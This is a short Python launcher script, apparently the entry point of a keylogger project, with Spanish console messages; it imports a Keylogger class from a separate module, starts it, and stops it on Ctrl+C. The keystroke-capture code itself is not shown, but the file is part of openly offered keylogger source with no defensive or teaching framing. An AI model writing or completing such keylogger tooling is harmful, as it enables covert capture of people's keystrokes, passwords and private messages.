#!/usr/bin/env python3
import signal
import sys
from termcolor import colored
from keylogger import Keylogger

def def_handler(sig, frame):
	print(colored(f"\n[!] Saliendo...\n", 'red'))
	my_keylogger.shutdown()
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	my_keylogger = Keylogger()
	my_keylogger.start()
